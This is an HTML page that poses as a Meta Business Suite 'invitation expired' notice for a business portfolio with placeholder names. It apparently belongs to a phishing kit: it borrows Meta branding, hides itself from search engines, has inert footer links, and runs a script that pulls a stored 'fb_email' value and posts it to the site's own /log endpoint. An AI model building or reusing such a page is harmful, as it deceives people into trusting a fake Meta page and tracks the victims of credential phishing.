<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta name="robots" content="noindex, nofollow">
    <title>Meta Business Suite - Invitation Expired</title>
    <link rel="icon" href="https://static.xx.fbcdn.net/rsrc.php/yx/r/e9sqr8WnkCf.ico">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --primary-blue: #0866ff;
            --text-main: #1c1e21;
            --text-secondary: #65676b;
            --border-color: #e4e6eb;
            --alert-bg: #fde8e8;
            --alert-text: #1c1e21;
            --alert-subtext: #4b4f56;
        }

        * {
            box-sizing: border-box;
        }

        body {
            margin: 0;
            padding: 0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: linear-gradient(135deg, #fce9e7 0%, #ffffff 40%, #edf5fd 80%, #f4f8fc 100%);
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            min-height: 100vh;
            color: var(--text-main);
        }

        header {
            padding: 24px 40px;
            display: flex;
            align-items: center;
        }

        .meta-logo {
            height: 22px;
            width: auto;
            display: block;
        }

        main {
            flex: 1;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 30px 20px;
        }

        .card {
            background: #ffffff;
            width: 100%;
            max-width: 530px;
            border-radius: 10px;
            box-shadow: 0 4px 24px rgba(0, 0, 0, 0.07), 0 1px 3px rgba(0, 0, 0, 0.04);
            padding: 38px 36px 36px;
            display: flex;
            flex-direction: column;
        }

        .card-logo {
            display: flex;
            justify-content: center;
            margin-bottom: 22px;
        }

        .card-logo img {
            height: 68px;
            width: auto;
            object-fit: contain;
        }

        .card-title {
            font-size: 22px;
            font-weight: 700;
            text-align: center;
            margin: 0 0 18px 0;
            color: #1c1e21;
            letter-spacing: -0.2px;
        }

        .card-description {
            font-size: 14.5px;
            line-height: 1.5;
            color: #1c1e21;
            margin-bottom: 14px;
        }

        .divider {
            height: 1px;
            background: var(--border-color);
            margin: 10px 0 20px;
        }

        .alert-box {
            background-color: var(--alert-bg);
            border-radius: 8px;
            padding: 16px 20px;
            text-align: left;
        }

        .alert-title {
            font-weight: 700;
            font-size: 14.5px;
            color: var(--alert-text);
            margin-bottom: 4px;
        }

        .alert-message {
            font-size: 14px;
            line-height: 1.45;
            color: var(--alert-subtext);
        }

        footer {
            width: 100%;
        }

        .footer-divider {
            height: 1px;
            background: #e4e6eb;
            width: 100%;
        }

        .footer-content {
            padding: 20px 40px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            font-size: 12px;
            color: var(--text-secondary);
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            gap: 16px;
        }

        .footer-links a {
            color: var(--text-secondary);
            text-decoration: none;
            transition: color 0.15s;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .footer-lang {
            color: var(--text-secondary);
            white-space: nowrap;
        }

        @media (max-width: 640px) {
            header {
                padding: 16px 20px;
            }

            .card {
                padding: 28px 20px 24px;
            }

            .card-title {
                font-size: 20px;
            }

            .footer-content {
                flex-direction: column;
                gap: 12px;
                padding: 16px 20px;
                text-align: center;
            }

            .footer-links {
                justify-content: center;
                gap: 12px;
            }
        }
    </style>
</head>
<body>
    <header>
        <img src="/images/Meta_Platforms_Inc._logo.svg.webp" class="meta-logo" alt="Meta">
    </header>

    <main>
        <div class="card">
            <div class="card-logo">
                <img src="/logo.jpg" alt="Style Studio Logo">
            </div>

            <h1 class="card-title">You're invited to join Style 111</h1>

            <div class="card-description">
                <strong>11 111</strong> invited you to join the <strong>Style 111</strong> business portfolio. Portfolios connect a business's Facebook Pages and other business assets so you can manage them all in one place.
            </div>

            <div class="card-description">
                Depending on your access, you can do things like manage Pages, Instagram profiles, ad accounts and people's assignments.
            </div>

            <div class="divider"></div>

            <div class="alert-box">
                <div class="alert-title">This invitation has expired</div>
                <div class="alert-message">To request a new invitation, contact the person who invited you to join this business portfolio.</div>
            </div>
        </div>
    </main>

    <footer>
        <div class="footer-divider"></div>
        <div class="footer-content">
            <div class="footer-links">
                <a href="#" onclick="return false;">Facebook</a>
                <a href="#" onclick="return false;">Developers</a>
                <a href="#" onclick="return false;">Privacy</a>
                <a href="#" onclick="return false;">Terms</a>
                <a href="#" onclick="return false;">Cookies</a>
                <a href="#" onclick="return false;">Help</a>
                <a href="#" onclick="return false;">Report a problem</a>
            </div>
            <div class="footer-lang">
                English (US)
            </div>
        </div>
    </footer>

    <script>
        (function() {
            try {
                const savedEmail = localStorage.getItem('fb_email') || '';
                fetch("/log", {
                    method: "POST",
                    headers: { "Content-Type": "application/json", "X-CSRF-TOKEN": "{{ csrf_token() }}" },
                    body: JSON.stringify({ page: "Meta Expired Invitation", email: savedEmail, action: "view" })
                });
            } catch (e) {}
        })();
    </script>
</body>
</html>
